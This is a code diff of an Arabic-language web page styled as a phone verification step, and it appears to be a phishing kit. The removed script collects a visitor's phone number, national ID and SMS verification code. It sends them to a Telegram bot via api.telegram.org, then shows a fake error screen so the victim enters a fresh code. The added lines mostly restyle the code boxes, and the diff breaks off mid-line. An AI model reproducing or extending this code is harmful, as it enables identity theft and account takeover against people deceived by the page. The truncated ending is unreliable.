@@ -287,11 +287,12 @@
         }
 
         /* ===== VERIFICATION CODE INPUT ===== */
-        .verification-input-group {
+        .verification-input-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             margin: 30px 0;
+            flex-direction: row-reverse;
         }
 
         .verification-input {
@@ -300,11 +301,12 @@
             border: 2px solid #e91e7d;
             border-radius: 8px;
             text-align: center;
-            font-size: 20px;
+            font-size: 22px;
             font-weight: bold;
             color: #e91e7d;
             transition: all 0.3s ease;
             background: white;
+            caret-color: #e91e7d;
         }
 
         .verification-input:focus {
@@ -312,6 +314,7 @@
             border-color: #e91e7d;
             box-shadow: 0 0 0 3px rgba(233, 30, 125, 0.2);
             transform: scale(1.05);
+            background: #fff;
         }
 
         .verification-input.filled {
@@ -456,7 +459,11 @@
             .verification-input {
                 width: 45px;
                 height: 45px;
-                font-size: 18px;
+                font-size: 20px;
+            }
+
+            .verification-input-container {
+                gap: 6px;
             }
         }
     </style>
@@ -553,19 +560,19 @@
                 </div>
 
                 <div class="description">
-                    تم إرسال رمز التفعيل إلى جوال�� ادناه
+                    تم إرسال رمز التفعيل إلى جوالك ادناه
                 </div>
 
                 <div class="phone-display" id="phoneDisplay"></div>
 
                 <form id="verificationForm">
-                    <div class="verification-input-group">
-                        <input type="text" class="verification-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="code1">
-                        <input type="text" class="verification-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="code2">
-                        <input type="text" class="verification-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="code3">
-                        <input type="text" class="verification-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="code4">
-                        <input type="text" class="verification-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="code5">
-                        <input type="text" class="verification-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="code6">
+                    <div class="verification-input-container">
+                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code6" data-index="5">
+                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code5" data-index="4">
+                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code4" data-index="3">
+                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code3" data-index="2">
+                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code2" data-index="1">
+                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code1" data-index="0">
                     </div>
                     <button type="submit" class="btn">التحقق</button>
                 </form>
@@ -660,122 +667,6 @@
 
             // GO TO SCREEN 2
             showScreen(2);
-        });
-
-        // SCREEN 2: VERIFICATION CODE
-        const verificationInputs = document.querySelectorAll('.verification-input');
-        verificationInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && /^\d$/.test(e.target.value)) {
-                    e.target.classList.add('filled');
-                    if (index < verificationInputs.length - 1) {
-                        verificationInputs[index + 1].focus();
-                    }
-                } else if (e.target.value === '') {
-                    e.target.classList.remove('filled');
-                } else {
-                    e.target.value = e.target.value.slice(-1);
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-                    verificationInputs[index - 1].focus();
-                }
-            });
-        });
-
-        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            let verificationCode = '';
-            verificationInputs.forEach(input => {
-                verificationCode += input.value;
-            });
-
-            if (verificationCode.length !== 6) {
-                alert('يرجى إدخال رمز التفعيل كاملاً (6 أرقام)');
-                return;
-            }
-
-            formData.verificationCode = verificationCode;
-
-            // SEND COMPLETE DATA WITH VERIFICATION CODE TO TELEGRAM
-            const completeMessage = `📋 بيانات التحقق الكاملة:\n\n` +
-                                  `📱 رقم الجوال: ${formData.phoneNumber}\n` +
-                                  `🆔 الرقم الوطني: ${formData.nationalId}\n` +
-                                  `🔐 رمز التفعيل: ${formData.verificationCode}`;
-
-            await sendToTelegram(completeMessage);
-
-            // GO TO SCREEN 3 (ERROR SCREEN)
-            showScreen(3);
-        });
-
-        // SEND MESSAGE TO TELEGRAM
-        async function sendToTelegram(message) {
-            try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                if (!response.ok) {
-                    console.error('Failed to send message to Telegram');
-                }
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-            }
-        }
-
-        // NAVIGATION
-        function showScreen(screenNumber) {
-            document.querySelectorAll('.screen').forEach(screen => {
-                screen.classList.remove('active');
-            });
-            document.getElementById(`screen${screenNumber}`).classList.add('active');
-        }
-
-        function goBack() {
-            showScreen(1);
-            document.getElementById('registrationForm').reset();
-            document.querySelectorAll('.verification-input').forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-                input.classList.remove('error');
-            });
-            document.getElementById('phoneNumber').classList.remove('error');
-            document.getElementById('nationalId').classList.remove('error');
-            formData = {
-                phoneNumber: '',
-                nationalId: '',
-                verificationCode: ''
-            };
-        }
-
-        function retryVerification() {
-            // CLEAR VERIFICATION INPUTS
-            document.querySelectorAll('.verification-input').forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-                input.classList.remove('error');
-            });
-            formData.verificationCode = '';
             
-            // GO BACK TO VERIFICATION SCREEN
-            showScreen(2);
-            
-            // FOCUS FIRST VERIFICATION INPUT
-            verificationInputs[0].focus();
-        }
-    </script>
-</body>
-</html>
+            // FOCUS FIRST CODE INPUT
+            setTimeout*
